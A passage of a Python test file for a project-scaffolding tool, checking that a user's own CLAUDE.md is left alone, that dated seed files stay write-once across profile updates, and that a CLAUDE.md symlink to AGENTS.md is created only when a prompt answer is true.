    assert (target / "CLAUDE.md").read_text(encoding="utf-8") == "the user's own file\n"
    assert not (target / "CLAUDE.md").is_symlink()  # skipped, byte-identical
    assert "CLAUDE.md" not in owned  # and never claimed


def test_dated_seed_entry_stays_write_once(tmp_path: Path) -> None:
    # seed entries substitute @DATE@ too — a regression flips the dated file to managed and a
    # later update would refresh the write-once file it exists to protect.
    prof = _make_profile(
        tmp_path,
        "team",
        {"docs/@DATE@-charter.md": "v1\n"},
        version="0.1.0",
        seed=("docs/@DATE@-charter.md",),
        by_path=True,
    )
    target = tmp_path / "proj"
    target.mkdir()
    cli.build(_config(target), Scaffolder(target), prof)
    from datetime import date

    dated = target / "docs" / f"{date.today():%Y-%m-%d}-charter.md"
    assert dated.read_text(encoding="utf-8") == "v1\n"
    _commit(target)
    _bump_profile(prof.root, version="0.1.1", files={"docs/@DATE@-charter.md": "v2\n"})
    assert update.run(target, dry_run=False, console=_Console()) == 0
    assert dated.read_text(encoding="utf-8") == "v1\n"  # seed: shipped once, never refreshed


def test_conditional_link_ships_only_when_true(tmp_path: Path) -> None:
    prof = _make_profile(
        tmp_path,
        "team",
        {"AGENTS.md": "contract\n"},
        prompts=[{"name": "use_claude", "type": "confirm", "message": "?", "default": False}],
    )
    data = json.loads((prof.root / "profile.json").read_text(encoding="utf-8"))
    data["links"] = {"CLAUDE.md": {"target": "AGENTS.md", "when": "answers.use_claude"}}
    (prof.root / "profile.json").write_text(json.dumps(data), encoding="utf-8")
    prof = profiles.load(prof.root, source="team")

    on, off = tmp_path / "on", tmp_path / "off"
    on.mkdir(), off.mkdir()
    owned_on = profiles.apply(prof, _config(on), Scaffolder(on), {"use_claude": True})
    owned_off = profiles.apply(prof, _config(off), Scaffolder(off), {"use_claude": False})
    assert (on / "CLAUDE.md").is_symlink() and "CLAUDE.md" in owned_on
    assert not (off / "CLAUDE.md").exists() and "CLAUDE.md" not in owned_off
